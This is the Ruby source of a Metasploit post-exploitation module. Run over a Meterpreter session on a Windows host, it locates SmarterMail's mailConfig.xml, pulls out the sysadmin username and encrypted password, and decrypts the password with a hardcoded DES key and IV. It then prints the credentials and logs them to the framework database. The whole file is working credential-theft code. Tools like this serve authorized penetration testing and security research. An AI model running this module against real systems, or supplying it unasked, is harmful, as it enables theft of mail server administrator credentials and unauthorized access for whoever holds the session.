# -*- coding: utf-8 -*-
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'msf/core/auxiliary/report'
require 'rex'

class Metasploit3 < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(
      info,
      'Name'          => 'Windows Gather SmarterMail Password Extraction',
      'Description'   => %q{
        This module extracts and decrypts the sysadmin password in the
        SmarterMail 'mailConfig.xml' configuration file. The encryption
        key and IV are publicly known.
        This module has been tested successfully on SmarterMail versions
        10.7.4842 and 11.7.5136.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
        'Joe Giron @theonlyevil1',            # Discovery and PoC
        'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
      ],
      'References'    =>
        [
          ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']
        ],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter']
    ))
  end

  #
  # Decrypt DES encrypted password string
  #
  def decrypt_des(encrypted)
    return nil if encrypted.nil?
    decipher = OpenSSL::Cipher::DES.new
    decipher.decrypt
    decipher.key = "\xb9\x9a\x52\xd4\x58\x77\xe9\x18"
    decipher.iv  = "\x52\xe9\xc3\x9f\x13\xb4\x1d\x0f"
    decipher.update(encrypted) + decipher.final
  end

  #
  # Find SmarterMail 'mailConfig.xml' config file
  #
  def check_smartermail
    drive = session.fs.file.expand_path('%SystemDrive%')
    ['Program Files (x86)', 'Program Files'].each do |program_dir|
      begin
        path = "#{drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml"
        vprint_status "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
          "Checking for SmarterMail config file: #{path}"
        return path if client.fs.file.stat(path)
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
          "Could not load #{path} - #{e}"
        return
      end
    end
  end

  #
  # Retrieve username and decrypt encrypted password string from the config file
  #
  def get_smartermail_creds(path)
    result = {}
    vprint_status "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
      'Retrieving SmarterMail sysadmin password'
    begin
      data = read_file("#{path}") || ''
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
        "Failed to download #{path} - #{e}"
      return
    end
    if data.nil?
      print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
        'Configuration file is empty.'
      return
    end
    username = data.match(/<sysAdminUserName>(.+)<\/sysAdminUserName>/)
    password = data.match(/<sysAdminPassword>(.+)<\/sysAdminPassword>/)
    result['username'] = username[1] unless username.nil?
    result['password'] = decrypt_des(Rex::Text.decode_base64(password[1])) unless password.nil?
    result
  end

  #
  # Find the config file, extract the encrypted password and decrypt it
  #
  def run
    # check for SmartMail config file
    config_path = check_smartermail
    if config_path.nil?
      print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
        'Could not find SmarterMail config file'
      return
    end

    # retrieve username and decrypted password from config file
    result = get_smartermail_creds(config_path)
    if result['password'].nil?
      print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
        'Could not decrypt password string'
      return
    end

    # report result
    print_good "#{session.sock.peerhost} (#{sysinfo['Computer']}) - Found credentials. " +
      "Username: '#{result['username']}' Password: '#{result['password']}'"
    report_auth_info(
      :host  => session.sock.peerhost,
      :sname => 'http',
      :user  => result['username'],
      :pass  => result['password'],
      :source_id   => session.db_record ? session.db_record.id : nil,
      :source_type => 'vuln')
  end
end
